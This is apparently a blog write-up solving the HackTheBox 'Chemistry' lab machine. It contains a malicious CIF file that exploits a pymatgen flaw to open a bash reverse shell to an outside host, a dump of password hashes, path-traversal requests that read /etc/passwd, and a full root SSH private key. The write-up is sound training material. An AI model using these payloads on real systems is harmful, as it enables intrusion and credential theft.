---
layaout: post
title: Chemistry Write Up HTB
image: assets/chemistry/Chemistry.png
date: 08-03-2025
categories: [Write ups]
tag: [Linux, LFI]
excerpt: "Chemistry is an easy difficulty machine on HackTheBox that takes you through a series of steps involving network enumeration, web application testing, and privilege escalation. The challenge provides an opportunity to practice various ethical hacking techniques in a controlled environment, ultimately leading to gaining root access. It's a great exercise for those looking to improve their skills in vulnerability exploitation and system access."
---
![img-description](/assets/chemistry/Chemistry.png)

**Chemistry** is an easy difficulty machine on HackTheBox that takes you through a series of steps involving network enumeration, web application testing, and privilege escalation. The challenge provides an opportunity to practice various ethical hacking techniques in a controlled environment, ultimately leading to gaining root access. It's a great exercise for those looking to improve their skills in vulnerability exploitation and system access.

## ENUMERATION
---
### Nmap scanning
---
As always, we start with Nmap, a widely used network scanning tool, to identify open ports.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.38 -vvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 17:54 CET
Initiating SYN Stealth Scan at 17:54
Scanning 10.10.11.38 [65535 ports]
Discovered open port 22/tcp on 10.10.11.38
Discovered open port 5000/tcp on 10.10.11.38
Completed SYN Stealth Scan at 17:54, 18.37s elapsed (65535 total ports)
Nmap scan report for 10.10.11.38
Host is up, received user-set (0.23s latency).
Scanned at 2025-03-07 17:54:21 CET for 18s
Not shown: 50646 closed tcp ports (reset), 14887 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63
```

We discovered two open ports, with a website hosted on port 5000

![img-description](/assets/chemistry/web_chm.png)

After registering, we discovered that it is possible to upload files with a `.cif` extension.

![img-description](/assets/chemistry/upload_chm.png)
## FOOTHOLD
---
After researching known vulnerabilities involving `.cif` files, we came across this <a href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f" target="_blank">information</a>
Therefore, we will create a file with the `.cif` extension, structured as follows:

```bash
data_5yOhtAoR
_audit_creation_date            2025-03-07
_audit_creation_method          "Hello people"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.16/6666 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
```

After that, we will upload the file and click on 'View
![[shell_cif_chem.png]]

Next, we set up our listener and receive the reverse shell as 'app'.

```bash
❯ revshell -p 6666
[i] Listening on 0.0.0.0:6666...
[+] Connected by 10.10.11.38:49590
[i] Attempting TTY upgrade...
[+] Binary 'python3' is installed, upgrading shell...
[i] Unsetting histfile...
app@chemistry:~$ id 
uid=1001(app) gid=1001(app) groups=1001(app)
```
## PRIVILEGE ESCALATION
---
After some enumeration, we found that port 8080 is open on localhost.

```bash
app@chemistry:~$ ss -tuln
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  
udp    UNCONN  0       0        127.0.0.53%lo:53          0.0.0.0:*             
udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:5000        0.0.0.0:*             
tcp    LISTEN  0       128          127.0.0.1:8080        0.0.0.0:*             
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       128               [::]:22             [::]:*      
```

But we cannot access it, so we will likely need to escalate to the other user named 'rosa'.

```bash
app@chemistry:/tmp$ curl 127.0.0.1:8080
curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused
```

While searching for potential credentials, we found a file named `database.db` in our user's home directory, and by chance, one of the hashes matched that of 'rosa'.

```bash
app@chemistry:~/instance$ pwd
/home/app/instance
app@chemistry:~/instance$ ls
database.db
app@chemistry:~/instance$ cat database.db
�f�K�ytableuseruserCREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
)';indexsqlite_autoindex_user_1user�3�5tablestructurestructureCREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
����l3Uwhare.cifc245a3b7-85b5-4e61-a792-882b904f3615
Maxel9347f9724ca083b17e39555c36fd9007*4f3615kristel6896ba7b11a62cacffbdaded457c6d92(
   �)Mwhare45c868d869fd6442cfb141cc936Mfabian4e5d71f53fdd2eabdbabb233113b5dc0+gelacia4af70eusebio6cad48078d0241cca9a7b322ecd073b3)	Mtaniaa4aa55e816205dc0389591c9f82f43bbMvictoriac3601ad2286a4293868ec2a4bc606ba3)Mpeter6845c17d298d95aa942127bdad2ceb9b*Mcarlos9ad48828b0955513f7cf0f7f6510c8f8*Mjobert3dec299e06f7ed187bac06bd3b670ab2*Mrobert02fcf7cfc10adc37959fb21f06c6b467(Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'Mapp197865e46b878d9e74a0346b6d59886a)Madmin2861debaf8d99436a10ed6f75a252abf
b��x�����l�����b__�	whare
                             kristeaxel
```

Since it's an MD5 hash, which is generally easy to crack, we will use <a href="https://crackstation.net/" target="_blank">crackstation</a> to crack it

![img-description](/assets/chemistry/rosa_pass.png)

Now that we have 'rosa's password, we can log in via SSH and simultaneously perform port forwarding for port 8080 (port forwarding is a technique that redirects traffic from a local port to a remote port, allowing us to access services that would otherwise be unavailable from our machine)

```bash
❯ ssh -L 8080:localhost:8080 rosa@10.10.11.38
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
rosa@chemistry:~$ ls
user.txt
```


## ROAD TO ROOT
---
Finally, we have access to the web service running on port 8080 

![img-description](/assets/chemistry/web_8080.png)

On the main page, we didn’t find anything of interest, and after running Nuclei, it didn’t yield any useful results. So, we will search for other directories using Dirsearch (Dirsearch is a directory enumeration tool for websites that helps uncover hidden paths and files on the web server by using a dictionary of potential directory and file names.)

```bash
❯ dirsearch -u http://localhost:8080
Target: http://localhost:8080/

[18:40:08] Starting: 
[18:40:27] 403 -   14B  - /assets/
[18:40:27] 403 -   14B  - /assets
```

We only found the 'assets' folder with a forbidden access. So, our last option was to try using Nuclei, and to our surprise, we discovered that the application is vulnerable to LFI (Local File Inclusion). LFI is a vulnerability that allows an attacker to include local files on the server, potentially leading to the exposure of sensitive information or the remote execution of malicious code if not properly managed. This occurs when the web application allows users to include files via URL parameters without proper validation.

```bash
❯ nuclei -u http://localhost:8080/assets
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.9

		projectdiscovery.io

[INF] Current nuclei version: v3.3.9 (latest)
[INF] Current nuclei-templates version: v10.1.3 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7709
[INF] Executing 7520 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 189 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1708 (Reduced 1614 Requests)
[INF] Using Interactsh Server: oast.pro
[CVE-2024-23334] [http] [high] http://localhost:8080/assets/static/../../../../etc/passwd
[CVE-2018-16288] [http] [high] http://localhost:8080/assets/signEzUI/playlist/edit/upload/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd
[CVE-2021-25864] [http] [high] http://localhost:8080/assets/hue/assets/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2fpasswd
[CVE-2021-3223] [http] [high] http://localhost:8080/assets/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

Given that this machine has an easy difficulty level, we will go ahead and attempt to retrieve the `id_rsa` file for the root user

```bash
❯ curl http://localhost:8080/assets/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot%2f.ssh%2fid_rsa > id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
UbnmTGaPeW4evLeehnYFQleaC9u//vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1v
j0wO69QoWrHERaRqmTzranVyYAdTmiXlGqUyiy0I7GVYqhv/QC7jt6For4PMAjcT0ED3Gk
HVJONbz2eav5aFJcOvsCG1aC93Le5R43Wgwo7kHPlfM5DjSDRqmBxZpaLpWK3HwCKYITbo
DfYsOMY0zyI0k5yLl1s685qJIYJHmin9HZBmDIwS7e2riTHhNbt2naHxd0WkJ8PUTgXuV2
UOljWP/TVPTkM5byav5bzhIwxhtdTy02DWjqFQn2kaQ8xe9X+Ymrf2wK8C4ezAycvlf3Iv
ATj++Xrpmmh9uR1HdS1XvD7glEFqNbYo3Q/OhiMto1JFqgWugeHm715yDnB3A+og4SFzrE
vrLegAOwvNlDYGjJWnTqEmUDk9ruO4Eq4ad1TYMbAAAFiPikP5X4pD+VAAAAB3NzaC1yc2
EAAAGBALBW2MxsbJIGemDNSzlCbI1Oulh4vGNmRUHDNxvFYzvjRyivD9ISFFG55kxmj3lu
Hry3noZ2BUJXmgvbv/73IgSzTlhqnoOio7KtpVUZAL8CtrLiUk7VWfKhotb49MDuvUKFqx
xEWkapk862p1cmAHU5ol5RqlMostCOxlWKob/0Au47ehaK+DzAI3E9BA9xpB1STjW89nmr
+WhSXDr7AhtWgvdy3uUeN1oMKO5Bz5XzOQ40g0apgcWaWi6Vitx8AimCE26A32LDjGNM8i
NJOci5dbOvOaiSGCR5op/R2QZgyMEu3tq4kx4TW7dp2h8XdFpCfD1E4F7ldlDpY1j/01T0
5DOW8mr+W84SMMYbXU8tNg1o6hUJ9pGkPMXvV/mJq39sCvAuHswMnL5X9yLwE4/vl66Zpo
fbkdR3UtV7w+4JRBajW2KN0PzoYjLaNSRaoFroHh5u9ecg5wdwPqIOEhc6xL6y3oADsLzZ
Q2BoyVp06hJlA5Pa7juBKuGndU2DGwAAAAMBAAEAAAGBAJikdMJv0IOO6/xDeSw1nXWsgo
325Uw9yRGmBFwbv0yl7oD/GPjFAaXE/99+oA+DDURaxfSq0N6eqhA9xrLUBjR/agALOu/D
p2QSAB3rqMOve6rZUlo/QL9Qv37KvkML5fRhdL7hRCwKupGjdrNvh9Hxc+WlV4Too/D4xi
JiAKYCeU7zWTmOTld4ErYBFTSxMFjZWC4YRlsITLrLIF9FzIsRlgjQ/LTkNRHTmNK1URYC
Fo9/UWuna1g7xniwpiU5icwm3Ru4nGtVQnrAMszn10E3kPfjvN2DFV18+pmkbNu2RKy5mJ
XpfF5LCPip69nDbDRbF22stGpSJ5mkRXUjvXh1J1R1HQ5pns38TGpPv9Pidom2QTpjdiev
dUmez+ByylZZd2p7wdS7pzexzG0SkmlleZRMVjobauYmCZLIT3coK4g9YGlBHkc0Ck6mBU
HvwJLAaodQ9Ts9m8i4yrwltLwVI/l+TtaVi3qBDf4ZtIdMKZU3hex+MlEG74f4j5BlUQAA
AMB6voaH6wysSWeG55LhaBSpnlZrOq7RiGbGIe0qFg+1S2JfesHGcBTAr6J4PLzfFXfijz
syGiF0HQDvl+gYVCHwOkTEjvGV2pSkhFEjgQXizB9EXXWsG1xZ3QzVq95HmKXSJoiw2b+E
9F6ERvw84P6Opf5X5fky87eMcOpzrRgLXeCCz0geeqSa/tZU0xyM1JM/eGjP4DNbGTpGv4
PT9QDq+ykeDuqLZkFhgMped056cNwOdNmpkWRIck9ybJMvEA8AAADBAOlEI0l2rKDuUXMt
XW1S6DnV8OFwMHlf6kcjVFQXmwpFeLTtp0OtbIeo7h7axzzcRC1X/J/N+j7p0JTN6FjpI6
yFFpg+LxkZv2FkqKBH0ntky8F/UprfY2B9rxYGfbblS7yU6xoFC2VjUH8ZcP5+blXcBOhF
hiv6BSogWZ7QNAyD7OhWhOcPNBfk3YFvbg6hawQH2c0pBTWtIWTTUBtOpdta0hU4SZ6uvj
71odqvPNiX+2Hc/k/aqTR8xRMHhwPxxwAAAMEAwYZp7+2BqjA21NrrTXvGCq8N8ZZsbc3Z
2vrhTfqruw6TjUvC/t6FEs3H6Zw4npl+It13kfc6WkGVhsTaAJj/lZSLtN42PXBXwzThjH
giZfQtMfGAqJkPIUbp2QKKY/y6MENIk5pwo2KfJYI/pH0zM9l94eRYyqGHdbWj4GPD8NRK
OlOfMO4xkLwj4rPIcqbGzi0Ant/O+V7NRN/mtx7xDL7oBwhpRDE1Bn4ILcsneX5YH/XoBh
1arrDbm+uzE+QNAAAADnJvb3RAY2hlbWlzdHJ5AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

And it worked. Now, we just need to set the correct permissions for our `id_rsa`, and we will be able to log in via SSH as root to finally retrieve our coveted flag.

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.11.38
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# ls
root.txt
```
![netrunner](/assets/images/netrunner.gif)